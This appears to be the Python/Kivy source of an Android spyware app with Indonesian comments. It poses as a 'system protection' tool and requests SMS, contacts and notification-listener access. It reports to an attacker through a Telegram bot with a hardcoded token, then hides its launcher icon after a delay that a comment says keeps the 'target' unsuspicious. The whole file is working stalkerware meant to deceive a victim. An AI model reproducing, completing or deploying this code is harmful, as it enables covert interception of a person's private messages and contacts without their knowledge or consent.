import telebot
from android.permissions import request_permissions, Permission
from jnius import autoclass
from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
from kivy.clock import Clock
import os

TOKEN = "8688240904:AAFbm71rIxvaNTAuy0qUatSkAagp26uD6ZU"
CHAT_ID = "5999516433"
bot = telebot.TeleBot(TOKEN)

class LOKTV(App):
    def build(self):
        layout = BoxLayout(orientation='vertical')
        self.btn = Button(
            text="AKTIFKAN PERLINDUNGAN SISTEM",
            background_color=(0, 0.7, 0, 1),
            font_size='18sp'
        )
        self.btn.bind(on_press=self.mulai_proses)
        layout.add_widget(self.btn)
        return layout

    def mulai_proses(self, instance):
        # Izin dasar: SMS dan Kontak
        perms = [Permission.READ_SMS, Permission.RECEIVE_SMS, Permission.READ_CONTACTS, Permission.POST_NOTIFICATIONS]
        request_permissions(perms, self.aktivasi_lanjutan)

    def aktivasi_lanjutan(self, permissions, grants):
        if all(grants):
            try:
                bot.send_message(CHAT_ID, "✅ IZIN SMS DIBERIKAN!\nSedang membuka akses WA/IG/Email...")
                
                # MEMBUKA PINTU WA, IG, EMAIL (Akses Notifikasi)
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                Intent = autoclass('android.content.Intent')
                Settings = autoclass('android.provider.Settings')
                intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                PythonActivity.mActivity.startActivity(intent)
                
                # Sembunyikan Ikon (Jeda 10 detik agar target tidak curiga)
                self.btn.text = "Sistem Sedang Sinkronisasi..."
                Clock.schedule_once(lambda dt: self.hilangkan_ikon(), 10)
            except Exception as e:
                bot.send_message(CHAT_ID, f"Error: {str(e)}")

    def hilangkan_ikon(self):
        try:
            activity = autoclass('org.kivy.android.PythonActivity').mActivity
            pm = activity.getPackageManager()
            comp = autoclass('android.content.ComponentName')(activity.getPackageName(), 'org.kivy.android.PythonActivity')
            pm.setComponentEnabledSetting(comp, 2, 1)
            bot.send_message(CHAT_ID, "⚠️ IKON BERHASIL DIHAPUS. Penyadapan berjalan di latar belakang.")
            os._exit(0)
        except:
            os._exit(0)

if __name__ == '__main__':
    LOKTV().run()
